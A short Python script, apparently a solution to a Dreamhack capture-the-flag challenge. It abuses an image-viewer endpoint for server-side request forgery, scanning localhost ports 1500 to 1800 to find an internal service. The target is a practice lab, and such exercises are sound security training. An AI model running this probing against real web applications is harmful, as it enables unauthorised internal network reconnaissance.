import requests
import sys
# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"
def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
def find_port():
    for port in range(1500, 1801):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
if __name__ == "__main__":
    chall_url = "http://host2.dreamhack.games:21656/img_viewer"
    internal_port = find_port()
